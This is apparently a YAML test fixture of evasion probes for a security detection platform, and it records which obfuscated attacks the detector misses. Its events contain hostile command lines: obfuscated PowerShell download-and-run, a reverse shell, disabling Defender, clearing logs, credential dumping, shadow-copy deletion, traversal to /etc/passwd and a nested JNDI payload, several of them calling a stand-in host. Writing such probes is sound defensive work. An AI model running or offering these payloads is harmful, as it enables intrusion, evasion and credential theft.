# Evasion probes. The platform is NOT expected to catch all of these; the point is to measure and
# publish what is missed rather than hide it. `known_gap: true` records an accepted, documented
# miss (excluded from the pass/fail gate but counted in the headline "evasion recall").
# If a probe starts being detected, the runner reports it as "gap closed" and the flag should be removed.
scenarios:
- {id: EVA-001, name: PowerShell with string concatenation to hide IEX, known_gap: true, techniques: [T1027], tactic: TA0005, events: [{title: Process creation, event_type: process.start, command_line: "powershell -c \"& ('i'+'ex') (New-Object Net.WebClient).('Down'+'loadString').Invoke('http://203.0.113.5/a')\""}]}
- {id: EVA-002, name: Reverse shell via renamed netcat, known_gap: true, techniques: [T1059.004], tactic: TA0002, events: [{title: Process creation, event_type: process.start, process_name: svc-helper, command_line: "svc-helper 203.0.113.5 4444 -e /bin/sh"}]}
- {id: EVA-003, name: Defender disabled via registry through reg import, known_gap: true, techniques: [T1562.001], tactic: TA0005, events: [{title: Process creation, event_type: process.start, command_line: "reg import C:\\Users\\Public\\d.reg"}]}
- {id: EVA-004, name: Log clearing with PowerShell .NET API, known_gap: true, techniques: [T1070.001], tactic: TA0005, events: [{title: Process creation, event_type: process.start, command_line: "powershell -c [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog('Security')"}]}
- {id: EVA-005, name: Credential dump via direct syscalls tool with innocuous name, known_gap: true, techniques: [T1003.001], tactic: TA0006, events: [{title: Process creation, event_type: process.start, process_name: update-helper.exe, command_line: "update-helper.exe --target 612 --out c:\\temp\\x.bin"}]}
- {id: EVA-006, name: Exfil over HTTPS to attacker domain with no tooling signature, known_gap: true, techniques: [T1041], tactic: TA0010, events: [{title: Flow record, event_type: network.flow, source_ip: 10.0.2.9, destination_ip: 203.0.113.91, raw_data: {bytes_out: 90000000}}]}
- {id: EVA-007, name: base64 split across arguments, techniques: [T1140], tactic: TA0005, events: [{title: Process creation, event_type: process.start, command_line: "echo Y3VybCBodHRwOi8v | base64 -d > /tmp/p; echo MjAzLjAuMTEzLjUvYS5zaCB8IHNo | base64 -d >> /tmp/p; sh /tmp/p"}]}
- {id: EVA-008, name: Case and whitespace variation of a known command, techniques: [T1490], tactic: TA0040, events: [{title: Process creation, event_type: process.start, command_line: "VsSaDmIn.ExE    DeLeTe   ShAdOwS   /All   /QuIeT"}]}
- {id: EVA-009, name: Quoted path variation of wevtutil, techniques: [T1070.001], tactic: TA0005, events: [{title: Process creation, event_type: process.start, command_line: "\"C:\\Windows\\System32\\wevtutil.exe\" cl \"Security\""}]}
- {id: EVA-010, name: URL-encoded path traversal, techniques: [T1190], tactic: TA0001, events: [{title: HTTP request, event_type: web.request, source_ip: 198.51.100.30, raw_data: {url: "/download?f=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"}}]}
- {id: EVA-011, name: Double URL-encoded traversal, known_gap: true, techniques: [T1190], tactic: TA0001, events: [{title: HTTP request, event_type: web.request, source_ip: 198.51.100.31, raw_data: {url: "/download?f=%252e%252e%252f%252e%252e%252fetc%252fpasswd"}}]}
- {id: EVA-012, name: Mixed-case JNDI with nested lookups, techniques: [T1190], tactic: TA0001, events: [{title: HTTP request, event_type: web.request, source_ip: 198.51.100.32, raw_data: {user_agent: "${${upper:j}${upper:n}${lower:d}i:${lower:l}dap://203.0.113.5/a}"}}]}
